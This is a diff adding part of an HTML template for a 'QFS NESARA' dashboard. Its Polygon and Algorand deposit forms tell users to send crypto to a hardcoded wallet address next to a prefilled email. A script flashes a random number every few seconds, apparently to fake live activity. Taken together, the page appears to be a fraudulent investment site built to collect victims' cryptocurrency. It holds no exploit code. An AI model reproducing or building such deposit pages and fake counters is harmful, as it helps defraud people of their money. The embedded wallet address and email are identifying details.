+                                <label for="btc_value">Amount in Polygon</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value2" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value2" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="polygonsub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <!--<p>or scan QR to make payment</p>-->
+                                <!--<div id="qrCode" style="max-width:100px; max-height:100px;"></div>-->
+                                <!--<div class="clearfix"></div>-->
+                                <!--<div class="form-group input-group-md " style="margin-top: 10px">-->
+                                <!--    <div id="link"></div>-->
+                                <!--</div>-->
+
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+                    
+
+                </div>
+                <script>
+                    function myFunction_polygon() {
+                        var copyText = document.getElementById("myInput_polygon");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_polygon");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+
+                </div>
+                
+                
+                
+                <div class="payment" id="algorand_page">
+
+                <div  style="" id="btc_form">
+                    <h3 class="text-success">
+                        Algorand Transaction Created
+                    </h3>
+                    <h4 style=" margin-top: 10px;">
+                        Hi your Tansaction have been Created.</h4>
+                    <p>Input the amount of algorand and Send the Exact Algorand to the given address</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                                <form method="post" action="">
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="address">Send Algorand to</label>
+
+                                <input type="text" class="form-control" style="color:white" id="myInput_algorand" placeholder="" name="" value="RAG2SID7NCEK3OBVPHAHURHYEHAS2KXAXRUWZJGIKNUOT655TWYKPNN33A" readonly>
+                                <button style="float: right;margin-top: 2px;" class="btn btn-success btn-sm" onclick="myFunction_algorand()"><i class="fi-rr-duplicate"></i> Copy Address</button> <span id="copy_algorand" class="text-success h6"></span>
+
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12" >
+                                <label for="email">Sender ID</label>
+                                <input type="email" class="form-control" style="color:white" id="email" placeholder="Enter email" name="txtemail" value="pablothebmp@gmail.com" readonly>
+                            </div>
+                            <div class="form-group input-group-md col-md-12">
+                                <label for="btc_value">Amount in Algorand</label>
+                                <input type="number" class="form-control" style="color:black"  id="btc_value2" placeholder="Amount" name="txtbitamount" >
+                            </div>
+
+                            <div class="form-group input-group-md col-md-12">
+
+                                <label for="dollar_value">Amount in USD</label>
+                                <input type="text" class="form-control" style="color:black"  id="dollar_value2" placeholder="" name="txtusdamount" >
+
+                            </div>
+                            
+                            
+                            <div class="form-group input-group-md col-md-12">
+
+                                
+                                <input type="submit" class="form-control btn btn-success"   value="Submit" name="algorandsub">
+
+                            </div>
+                            
+                            </form>
+
+                        </div>
+                        <div class="col-md-6"><center>
+                                <p class="center ">
+                                <h5><strong>Please note that the equivalent of the exact amount paid will be credited into your Account.</strong> If you are interested in learning more about the transaction process or have an issue please contact support to get a detailed description of the process. </h5>
+                                </p>
+                            </center>
+                        </div>
+
+                    </div>
+                    
+
+                </div>
+                <script>
+                    function myFunction_algorand() {
+                        var copyText = document.getElementById("myInput_algorand");
+                        copyText.select();
+                        copyText.setSelectionRange(0, 99999)
+                        document.execCommand("copy");
+                        var result = document.getElementById("copy_algorand");
+                        result.innerHTML="Address copied"
+                        setTimeout(function(){ result.innerHTML=""}, 5000)
+                    }
+                </script>
+
+
+
+                </div>
+                
+               
+                
+        </div>
+        <script type="text/javascript">
+            let payment_proceed_btc = document.querySelector('#BITCOIN_deposit');
+            payment_proceed_btc.addEventListener('click', (e) => {
+                e.preventDefault();
+            let payment = document.getElementById('payment_page');
+            let BTCpayment = document.getElementById('BITCOIN_page');
+            let MCpayment = document.getElementById('MASTERCARD_page');
+            let Vpayment = document.getElementById('VISA_page');
+
+            BTCpayment.classList.remove('hidden')
+            MCpayment.classList.add('hidden')
+            Vpayment.classList.add('hidden')
+            
+             $("#xdc_page").hide();
+            $("#ripple_page").hide();
+            $("#polygon_page").hide();
+            $("#algorand_page").hide();
+
+            });
+            let payment_proceed_mc = document.querySelector('#MASTERCARD_deposit');
+            payment_proceed_mc.addEventListener('click', (e) => {
+                e.preventDefault();
+            let payment = document.getElementById('payment_page');
+            let BTCpayment = document.getElementById('BITCOIN_page');
+            let MCpayment = document.getElementById('MASTERCARD_page');
+            let Vpayment = document.getElementById('VISA_page');
+
+            MCpayment.classList.remove('hidden')
+            BTCpayment.classList.add('hidden')
+            Vpayment.classList.add('hidden')
+             $("#xdc_page").hide();
+            $("#ripple_page").hide();
+            $("#polygon_page").hide();
+            $("#algorand_page").hide();
+
+            });
+            let payment_proceed_vs = document.querySelector('#VISA_deposit');
+            payment_proceed_vs.addEventListener('click', (e) => {
+                e.preventDefault();
+            let payment = document.getElementById('payment_page');
+            let BTCpayment = document.getElementById('BITCOIN_page');
+            let MCpayment = document.getElementById('MASTERCARD_page');
+            let Vpayment = document.getElementById('VISA_page');
+
+            Vpayment.classList.remove('hidden')
+            MCpayment.classList.add('hidden')
+            BTCpayment.classList.add('hidden')
+            
+             $("#xdc_page").hide();
+            $("#ripple_page").hide();
+            $("#polygon_page").hide();
+            $("#algorand_page").hide();
+
+
+            });
+        </script>
+                        </div>
+                        
+                    </div>
+
+                </section>
+            </div>
+            
+             
+            
+
+
+                        </div>
+                </div>
+
+                <!-- General JS Scripts -->
+                <script src="https://qfsnesara.io/assets/dashboard/modules/jquery.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/modules/popper.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/modules/bootstrap/js/bootstrap.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/modules/nicescroll/jquery.nicescroll.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/js/stisla.js"></script>
+
+                <!-- JS Libraies -->
+                <script src="https://qfsnesara.io/assets/dashboard/js/pusher.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/js/vue.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/js/axios.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/js/notiflix-aio-2.7.0.min.js"></script>
+                <script src="https://qfsindependentsystem.com/qfs_assets/assets/js/xhamster.min.js"></script>
+                <script src="https://qfsindependentsystem.com/qfs_assets/assets/js/notify-pop.js"></script>
+                
+                	<script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {pageLanguage: 'en'},
+                'google_translate_element'
+            );
+        }
+    </script>
+ 
+    <script type="text/javascript"
+            src=
+"https://translate.google.com/translate_a/element.js?
+cb=googleTranslateElementInit">
+    </script>
+
+                <!-- Template JS File -->
+                <script src="https://qfsnesara.io/assets/dashboard/js/scripts.js"></script>
+            
+                    <script>
+                            $(document).ready(function(){
+                                setInterval(function(){
+                                    let rnum = getRandomInt(5,500);
+                                    $('#digit').html(rnum);
+                                },5000)
+                                
+                            });
+
+                            function getRandomInt(min, max) {
+                                min = Math.ceil(min);
+                                max = Math.floor(max);
+                                return Math.floor(Math.random() * (max - min + 1)) + min;
+                            }
+                    </script>
+
+                <script>
+                    $(document).ready(function() {
+                        $(document).ajaxStart(function() {
+                            $('#wait').removeClass('d-none').show();
+                        });
+                        $(document).ajaxComplete(function() {
+                            $('#wait').hide();
+                        });
+                    });
+                </script>
+
+                <script>
+                    'use strict';
+                    let pushNotificationArea = new Vue({
+                        el: "#pushNotificationArea",
+                        data: {
+                            items: [],
+                        },
+                        beforeMount() {
+                            this.getNotifications();
+                            this.pushNewItem();
+                        },
+                        methods: {
+                            getNotifications() {
+                                let app = this;
+                                axios.get("https://qfsnesara.io/user/push-notification-show")
+                                    .then(function(res) {
+                                        app.items = res.data;
+                                    })
+                            },
+                            readAt(id, link) {
+                                let app = this;
+                                let url = "https://qfsnesara.io/user/push-notification-readAt/0";
+                                url = url.replace(/.$/, id);
+                                axios.get(url)
+                                    .then(function(res) {
+                                        if (res.status) {
+                                            app.getNotifications();
+                                            if (link !== '#') {
+                                                window.location.href = link
+                                            }
+                                        }
+                                    })
+                            },
+                            readAll() {
+                                let app = this;
+                                let url = "https://qfsnesara.io/user/push.notification.readAll";
+                                axios.get(url)
+                                    .then(function(res) {
+                                        if (res.status) {
+                                            app.items = [];
+                                        }
+                                    })
+                            },
+                            pushNewItem() {
+                                let app = this;
+                                Pusher.logToConsole = false;
+                                let pusher = new Pusher("your_app_KEY", {
+                                    encrypted: true,
+                                    cluster: "ap2"
+                                });
+                                let channel = pusher.subscribe('user-notification.' + "118");
+                                channel.bind('App\\Events\\UserNotification', function(data) {
+                                    app.items.unshift(data.message);
+                                });
+                                channel.bind('App\\Events\\UpdateUserNotification', function(data) {
+                                    app.getNotifications();
+                                });
+                            }
+                        }
+                    });
+
+                    // for search
+                    $(document).on('input', '.global-search', function() {
+                        var search = $(this).val().toLowerCase();
+
+                        if (search.length == 0) {
+                            $('.search-result').find('.content').html('');
+                            $(this).siblings('.search-backdrop').addClass('d-none');
+                            $(this).siblings('.search-result').addClass('d-none');
+                            return false;
+                        }
+
+                        $('.search-result').find('.content').html('');
+                        $(this).siblings('.search-backdrop').removeClass('d-none');
+                        $(this).siblings('.search-result').removeClass('d-none');
+
+                        var match = $('.sidebar-menu li').filter(function(idx, element) {
+                            if (!$(element).find('a').hasClass('has-dropdown') && !$(element).hasClass('menu-header'))
+                                return $(element).text().trim().toLowerCase().indexOf(search) >= 0 ? element : null;
+                        }).sort();
+
+                        if (match.length == 0) {
+                            $('.search-result').find('.content').append(`<div class="search-item"><a href="javascript:void(0)">No result found</a></div>`);
+                            return false;
+                        }
+
+                        match.each(function(index, element) {
+                            var item_text = $(element).text().replace(/(\d+)/g, '').trim();
+                            var item_url = $(element).find('a').attr('href');
+                            if (item_url != '#') {
+                                $('.search-result').find('.content').append(`<div class="search-item"><a href="${item_url}">${item_text}</a></div>`);
+                            }
+                        });
+                    });
+                </script>
+                
+                
+
+
+                <script src="https://qfsnesara.io/assets/dashboard/js/Chart.min.js"></script>
+                <script type="text/javascript" src="https://qfsnesara.io/assets/dashboard/js/moment.min.js"></script>
+                <script type="text/javascript" src="https://qfsnesara.io/assets/dashboard/js/daterangepicker.min.js"></script>
+                <script src="https://qfsnesara.io/assets/dashboard/js/qrjs2.min.js"></script>
+                <script type="module">
+                    import {initializeApp} from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js"; import { getMessaging, getToken, onMessage } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-messaging.js"; const firebaseConfig = { apiKey: "Your_API Key",
+                    authDomain: "appSecret", projectId: "Project_Id", storageBucket: "Storage_Bucket", messagingSenderId: "Sender_Id", appId: "App_Id", measurementId: "Measurement_Id" }; const app = initializeApp(firebaseConfig); const messaging = getMessaging(app);
+                    if ('serviceWorker' in navigator) { navigator.serviceWorker.register('' + `/firebase-messaging-sw.js`, {scope: './'}).then(function (registration) { requestPermissionAndGenerateToken(registration); } ).catch(function (error) { }); } else { } onMessage(messaging,
+                    (payload) => { if (payload.data.foreground || parseInt(payload.data.foreground) == 1) { const title = payload.notification.title; const options = { body: payload.notification.body, icon: payload.notification.icon, }; new Notification(title, options);
+                    } }); function requestPermissionAndGenerateToken(registration) { document.addEventListener("click", function (event) { if (event.target.id == 'allow-notification') { Notification.requestPermission().then((permission) => { if (permission === 'granted')
+                    { getToken(messaging, { serviceWorkerRegistration: registration, vapidKey: "Your_Vapid Key" }) .then((token) => { $.ajax({ url: "https://qfsnesara.io/user/save-token", method: "post", data: { token: token, }, success: function (res) { } }); window.newApp.notificationPermission
+                    = 'granted'; }); } else { window.newApp.notificationPermission = 'denied'; } }); } }); }
+                </script>
+                <script>
+                    window.newApp = new Vue({
+                        el: "#firebase-app",
+                        data: {
+                            user_foreground: '',
+                            user_background: '',
+                            notificationPermission: Notification.permission,
+                            is_notification_skipped: sessionStorage.getItem('is_notification_skipped') == '1'
+                        },
+                        mounted() {
+                            this.user_foreground = "0";
+                            this.user_background = "0";
+                        },
+                        methods: {
+                            skipNotification() {
+                                sessionStorage.setItem('is_notification_skipped', '1');
+                                this.is_notification_skipped = true;
+                            }
+                        }
+                    });
+                </script>
+           <script src="//code.jivosite.com/widget/z87hiNS2xL" async></script>
+
+
+
+                <script>
+                    'use strict';
+                    $(document).ready(function() {
+                        $('input[name="daterange"]').daterangepicker({
+                            opens: 'left',
+                            startDate: moment().startOf('month'),
+                            endDate: moment().endOf('month'),
+                            locale: {
+                                format: 'MMMM D, YYYY'
+                            }
+                        }, function(start, end, label) {
+                            getTransaction(start.format('YYYY-MM-DD'), end.format('YYYY-MM-DD'));
+                        });
+
+                        function getTransaction(start, end) {
+                            $.ajax({
+                                    method: "GET",
+                                    url: "https://qfsnesara.io/user/get-transaction-chart",
+                                    dataType: "json",
+                                    data: {
+                                        'start': start,
+                                        'end': end,
+                                    }
+                                })
+                                .done(function(response) {
+                                    new Chart(document.getElementById("line-chart"), {
+                                        type: 'line',
+                                        data: {
+                                            labels: response.labels,
+                                            datasets: [{
+                                                    data: response.dataDeposit,
+                                                    label: "Deposit",
+                                                    borderColor: "#1abc9c",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataFund,
+                                                    label: "Add Fund",
+                                                    borderColor: "#00cec9",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataTransfer,
+                                                    label: "Send Money",
+                                                    borderColor: "#3498db",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataRequestMoney,
+                                                    label: "Request Money",
+                                                    borderColor: "#9b59b6",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataVoucher,
+                                                    label: "Voucher",
+                                                    borderColor: "#6b7b98",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataInvoice,
+                                                    label: "Invoice",
+                                                    borderColor: "#6777ef",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataRedeem,
+                                                    label: "Redeem Code",
+                                                    borderColor: "#f39c12",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataEscrow,
+                                                    label: "Escrow",
+                                                    borderColor: "#273c75",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataPayout,
+                                                    label: "Payout",
+                                                    borderColor: "#bdc3c7",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataExchange,
+                                                    label: "Exchange",
+                                                    borderColor: "#e74c3c",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataDispute,
+                                                    label: "Dispute",
+                                                    borderColor: "#8e44ad",
+                                                    fill: false
+                                                },
+                                                {
+                                                    data: response.dataCommissionEntry,
+                                                    label: "Commission",
+                                                    borderColor: "#5444ad",
+                                                    fill: false
+                                                },
+                                            ]
+                                        }
+                                    });
+                                });
+                        }
+
+                        new Chart(document.getElementById("line-chart"), {
+                            type: 'line',
+                            data: {
+                                labels: ["1st Jun", "2nd Jun", "3rd Jun", "4th Jun", "5th Jun", "6th Jun", "7th Jun", "8th Jun", "9th Jun", "10th Jun", "11th Jun", "12th Jun", "13th Jun", "14th Jun", "15th Jun", "16th Jun", "17th Jun", "18th Jun", "19th Jun", "20th Jun", "21st Jun", "22nd Jun", "23rd Jun", "24th Jun", "25th Jun", "26th Jun", "27th Jun", "28th Jun", "29th Jun", "30th Jun"],
+                                datasets: [{
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Deposit",
+                                        borderColor: "#1abc9c",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Add Fund",
+                                        borderColor: "#00cec9",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Send Money",
+                                        borderColor: "#3498db",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Request Money",
+                                        borderColor: "#9b59b6",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "QR Payment",
+                                        borderColor: "#CCFB5D",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Voucher",
+                                        borderColor: "#6b7b98",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Invoice",
+                                        borderColor: "#6777ef",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Redeem Code",
+                                        borderColor: "#f39c12",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Escrow",
+                                        borderColor: "#273c75",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Payout",
+                                        borderColor: "#bdc3c7",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Exchange",
+                                        borderColor: "#e74c3c",
+                                        fill: false
+                                    },
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Dispute",
+                                        borderColor: "#8e44ad",
+                                        fill: false
+                                    },
+
+                                    {
+                                        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+                                        label: "Commission",
+                                        borderColor: "#5444ad",
+                                        fill: false
+                                    },
+                                ]
+                            }
+                        });
+                    });
+
+                    var qr = QRCode.generatePNG(document.getElementById('qrUrl').value, {
+                        ecclevel: "M",
+                        format: "html",
+                        margin: 4,
+                        modulesize: 8
+                    });
+
+                    var img = document.createElement("img");
+                    img.src = qr;
+                    document.getElementById('qrcode').appendChild(img);
+
+                    //For download
+                    var download = document.getElementById('download-qr').href = qr;
+                </script>
+                <script>
+                    (function($) {
+
+                        "use strict";
+                        $('.addBtn').on('click', (e) => {
+                            var modal = $('#addModal');
+                            modal.modal('show');
+                        });
+                    })(jQuery);
+                </script>
+
+
+
+                 <script>
+                 document.addEventListener('DOMContentLoaded', function() {
+                // Simulating a 3-second delay before hiding the preloader and changing the background color
+                setTimeout(function() {
+                // Hide the preloader
+                var preloader = document.getElementById('preloader');
+                preloader.style.display = 'none';
+                
+                document.getElementById("content").style.display = "block";
+                
+                // Change the background color to a different color
+                document.body.style.backgroundColor = '#fff'; // Set your desired background color
+                }, 2000); // 2000 milliseconds (2 seconds) delay
+                });
+            </script>
+            
+            <script> 
+        $('#click').on('click', function () { 
+            if ($('#click').text() === 'show') { 
+  
+                // This block is executed when 
+                // you click the show button 
+                $('#click').text('hide'); 
+                $('#element').css('display', 'flex'); 
+            } 
+            else { 
+  
+                // This block is executed when 
+                // you click the hide button 
+                $('#click').text('show'); 
+                $('#element').css('display', 'none'); 
+            } 
+        }); 
+    </script>
+    
+    <script>
+     $(function () {
+        $("#xdc_page").hide();
+        $("#ripple_page").hide();
+        $("#polygon_page").hide();
+        $("#algorand_page").hide();
+        
+        // $("payment_page").hide();
+        // $("BITCOIN_page").hide();
+        // $("MASTERCARD_page").hide();
+        // $("VISA_page").hide();
+
+        
+        $("#coin1").click(function() {
+            $("#xdc_page").hide();
+            $("#ripple_page").show();
+            $("#polygon_page").hide();
+            $("#algorand_page").hide();
+            
+            });
+
+        $("#coin2").click(function() {
+            $("#xdc_page").hide();
+            $("#ripple_page").hide();
+            $("#polygon_page").hide();
+            $("#algorand_page").show();
+            
+        });
+        
+        $("#coin3").click(function() {
+            $("#xdc_page").show();
+            $("#ripple_page").hide();
+            $("#polygon_page").hide();
+            $("#algorand_page").hide();
+            
+        });
+        
+        $("#coin4").click(function() {
+            $("#xdc_page").hide();
+            $("#ripple_page").hide();
+            $("#polygon_page").show();
+            $("#algorand_page").hide();
+            
+        });
+
+        
+        
+    });
+            
+   </script>         
+            
+   
+
+
+
+
+
+  
+            {% endblock %}
